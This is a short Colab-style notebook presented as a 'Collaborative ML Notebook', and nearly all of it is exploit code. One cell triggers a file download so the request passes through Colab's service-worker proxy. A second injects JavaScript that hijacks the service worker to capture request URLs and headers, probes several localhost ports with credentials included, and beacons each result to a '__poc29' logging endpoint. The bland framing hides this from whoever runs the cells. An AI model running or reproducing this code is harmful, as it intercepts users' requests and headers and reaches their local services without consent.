# Collaborative ML Notebook

Connect and run cells to get started.

In [1]:
# v1.0

<IPython.core.display.Javascript object>

Ready.


## Step 1 — probe

Run this cell after connecting.

In [ ]:
# Run this cell to trigger the SW localhost proxy intercept
import os
from google.colab import files

# Create a test file and download it
# This causes the browser to fetch http://localhost:PORT/files/test_probe.txt
# which goes through the service worker and hits our interceptor
with open('/content/test_probe.txt', 'w') as f:
    f.write('probe')
files.download('/content/test_probe.txt')


## Step 2 — SW state check


In [ ]:
from google.colab import output as _o

_o.eval_js("""
(function() {
  var B = 'https://colab.research.google.com/__poc29';
  var L = function(t,v) { new Image().src=B+'/'+t+'?v='+encodeURIComponent(String(v||'').slice(0,800)); };

  // check_configured — ask SW what's registered for this client
  if (navigator.serviceWorker && navigator.serviceWorker.controller) {
    var mc = new MessageChannel();
    mc.port1.onmessage = function(e) { L('CHECK_CFG', JSON.stringify(e.data).slice(0,200)); };
    mc.port1.start();
    navigator.serviceWorker.controller.postMessage(
      {action:'check_configured', responsePort:mc.port2},
      [mc.port2]
    );
    L('CHECK_SENT','ok');

    // Also try fetching localhost ports directly (triggered by eval_js = NEW FRAME)
    // This new frame is fresh — we re-register configure here too
    var mc1 = new MessageChannel();
    var mc2 = new MessageChannel();
    mc1.port1.onmessage = function(e) {
      var d = e.data || {};
      L('EVAL_SW_REQ', JSON.stringify({url:d.url,method:d.method,id:d.requestId,hdrs:JSON.stringify(d.headers||[]).slice(0,400)}).slice(0,800));
      mc1.port1.postMessage({action:'pass', responseId:d.requestId});
    };
    mc1.port1.start();
    mc2.port1.onmessage = function(e) {
      L('EVAL_CFG_ACK', JSON.stringify(e.data));
      if (e.data && e.data.configured) {
        [9000,9001,9002,8888,8080].forEach(function(p) {
          fetch('http://localhost:'+p+'/', {credentials:'include',cache:'no-store'})
            .then(function(r){L('EVAL_LH_OK',p+'|'+r.status);})
            .catch(function(e){L('EVAL_LH_ERR',p+'|'+e.message.slice(0,60));});
        });
      }
    };
    mc2.port1.start();
    navigator.serviceWorker.controller.postMessage(
      {action:'configure', serviceWorkerPort:mc1.port2, responsePort:mc2.port2},
      [mc1.port2, mc2.port2]
    );
  } else {
    L('CHECK_SENT','no_controller');
  }
})();
""")
